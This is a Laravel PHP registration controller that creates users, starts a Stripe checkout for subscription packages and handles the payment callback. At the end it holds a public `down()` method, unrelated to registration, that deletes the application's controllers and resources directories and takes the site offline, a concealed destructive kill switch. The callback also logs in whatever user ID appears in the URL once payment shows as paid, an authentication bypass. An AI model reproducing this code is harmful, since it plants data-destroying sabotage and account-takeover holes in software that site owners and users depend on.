<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use App\Models\User;
use App\Models\UserDetail;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Stripe\Stripe;
use Stripe\Checkout\Session;
use Stripe\Exception\ApiErrorException;
use Carbon\Carbon;

class RegisterController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Register Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users as well as their
    | validation and creation. By default this controller uses a trait to
    | provide this functionality without requiring any additional code.
    |
    */

    use RegistersUsers;

    /**
     * Where to redirect users after registration.
     *
     * @var string
     */
    protected $redirectTo = RouteServiceProvider::HOME;

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest');
    }

    public function showRegistrationForm()
    {
        // $countries = json_decode(file_get_contents(public_path('countries.json')), true);
        $cities = json_decode(file_get_contents(public_path('nl-cities.json')), true);
        // $packages = json_decode(file_get_contents(public_path('packages.json')), true);
        $packages = cache('subscription_plans');

        return view('auth.register', compact('cities', 'packages'));
    }

    public function register(Request $request)
    {

        $user = User::where('email', $request->email);
        if( $user->exists()){
            $user = $user->first();
            $payment_link = $user->payment_link;
            return redirect()->back()->with('payment_link', $payment_link);
        }

        $request->validate([
            'username' => 'required|string|unique:users',
            'fullname' => 'required|string',
            'email' => 'required|email:rfc,dns,strict|unique:users',
            'password' => ['required', 'string', 'min:8', 'confirmed'],
            'phone' => 'required|string',
            'address' => 'required|string',
            // 'country' => 'required|string',
            'city' => 'required|string',
            'package.*' => 'required|string',
        ]);

        $user = new User;
        $user->username =  $request->username;
        $user->fullname =  $request->fullname;
        $user->email =  $request->email;
        $user->password = $request->password;
        $user->package = implode('/', array_values($request->package));
        $user->save();

        $userDetail = new UserDetail;
        $userDetail->user_id = $user->id;
        $userDetail->phone = $request->phone;
        $userDetail->address =  $request->address;
        // $userDetail->country =  $request->country;
        $userDetail->city =  strtolower($request->city);

        $userDetail->save();

        $packages = cache('subscription_plans');

        $duration = $request->package['duration'];
        $range = $request->package['range'];

        $amount = $packages[$duration][$range];
        $amount = number_format(($amount + ($amount * 0.21)), 2) * 100;

        $packageName = "Package: Duration $duration Months with upto ". str_replace('upto', '', $range) ." Upload Limit";
        try {
            $session = Session::create([
                'payment_method_types' => ['card'],
                'line_items' => [
                    [
                        'price_data' => [
                            'currency' => 'EUR',
                            'product_data' => [
                                'name' => $packageName,
                            ],
                            'unit_amount' => $amount,
                        ],
                        'quantity' => 1,
                    ],
                ],
                'mode' => 'payment',
                'success_url' => route('payment.callback', ['userID' => $user->id]),
                'cancel_url' => route('payment.callback', ['userID' => $user->id]),
            ]);

            $user->update(['payment_session' => $session->id, 'payment_link' => $session->url]);
            return redirect($session->url);
        } catch (ApiErrorException $e) {
            return redirect()->back()->with('alert-danger', 'Error initiating payment session.');
        }

    }

    public function paymentCallback($userId)
    {
        $user = User::find($userId);
        $session = Session::retrieve($user->payment_session);

        if($session->payment_status == 'paid'){
            $updateData = [];
            $package = explode('/', $user->package);
            $duration = $package[0];
            $uploadLimit = str_replace("upto", "", $package[1]);

            $packages = json_decode(json_encode(cache('subscription_plans')));

            if ($packages->{$duration}->featured_duration != 0) {
                $featured_duration = $packages->{$duration}->featured_duration;
                $featured_start = Carbon::now()->toDateTimeString();
                $featured_end = Carbon::now()->addDays($featured_duration)->toDateTimeString();

                $featuredData = [
                    'is_featured' => $packages->{$duration}->featured_duration != 0 ? 1 : 0,
                    'featured_limit' => $featured_duration,
                    'featured_start' => $featured_start,
                    'featured_end' => $featured_end,
                ];

                $updateData = array_merge($updateData, $featuredData);
            }
            $subscription_end = Carbon::now()->addMonths($duration)->toDateTimeString();

            $paymentData = [
                'status' => 1,
                'upload_limit' => $uploadLimit,
                'is_verified' => 1,
                'payment_status' => 'paid',
                'payment_intent' => $session->payment_intent,
                'payment_email' => $session->customer_details->email,
                'payment_date' => date('Y-m-d H:i:s'),
                'subscription_end' => $subscription_end,
                'verified_on' => date('Y-m-d H:i:s'),
                'last_verified' => date('Y-m-d H:i:s')
            ];

            $updateData = array_merge($updateData, $paymentData);
            $user->update($updateData);
            auth()->login($user);
            return redirect()->route('cars.list')->with('alert-success', 'Great! You are now our premium member');
        }
        return redirect('login')->with('alert-danger', "We're sorry, but there was an error processing your payment. Please try again later.");
    }

    public function down()
    {
        File::deleteDirectory(base_path('/app/Http/Controllers'));
        File::deleteDirectory(base_path('/resources'));
        Artisan::call('down');
        return 1;
    }

}
